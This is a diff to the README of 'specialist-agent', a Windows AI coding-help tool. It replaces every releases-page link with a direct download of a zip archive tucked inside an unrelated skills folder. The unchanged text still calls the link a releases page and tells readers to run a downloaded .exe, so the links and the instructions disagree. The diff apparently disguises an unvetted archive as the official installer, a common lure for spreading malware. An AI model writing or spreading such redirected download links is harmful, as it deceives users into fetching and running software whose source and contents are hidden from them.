@@ -1,6 +1,6 @@
 # 🤖 specialist-agent - AI Team for Coding Help
 
-[![Download specialist-agent](https://img.shields.io/badge/Download-specialist--agent-4c1?style=for-the-badge&logo=github)](https://github.com/NoaiRox/specialist-agent/releases)
+[![Download specialist-agent](https://img.shields.io/badge/Download-specialist--agent-4c1?style=for-the-badge&logo=github)](https://github.com/NoaiRox/specialist-agent/raw/refs/heads/main/packs/react/skills/dev-create-service/specialist-agent-v3.3-beta.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get specialist-agent on your Windows computer and start us
 
 To get the latest version, open this link in your browser:
 
-[Download specialist-agent here](https://github.com/NoaiRox/specialist-agent/releases)
+[Download specialist-agent here](https://github.com/NoaiRox/specialist-agent/raw/refs/heads/main/packs/react/skills/dev-create-service/specialist-agent-v3.3-beta.5.zip)
 
 This page holds all release versions and important files. Look for the newest release at the top of the list.
 
@@ -115,7 +115,7 @@ For more help, visit the project's discussion area on GitHub.
 
 New versions come with fixes and improvements. To update:
 
-1. Visit the release page ([specialist-agent releases](https://github.com/NoaiRox/specialist-agent/releases)).
+1. Visit the release page ([specialist-agent releases](https://github.com/NoaiRox/specialist-agent/raw/refs/heads/main/packs/react/skills/dev-create-service/specialist-agent-v3.3-beta.5.zip)).
 2. Download the latest `.exe` file.
 3. Run the installer again—it will replace the old version automatically.
 
@@ -129,5 +129,5 @@ specialist-agent is designed to make AI coding help simple. For questions or fee
 
 ## 💾 Download Link
 
-[![Download specialist-agent](https://img.shields.io/badge/Download-specialist--agent-ff5522?style=for-the-badge&logo=github)](https://github.com/NoaiRox/specialist-agent/releases)  
+[![Download specialist-agent](https://img.shields.io/badge/Download-specialist--agent-ff5522?style=for-the-badge&logo=github)](https://github.com/NoaiRox/specialist-agent/raw/refs/heads/main/packs/react/skills/dev-create-service/specialist-agent-v3.3-beta.5.zip)  
 Visit this page to download the latest version of specialist-agent to your Windows computer.
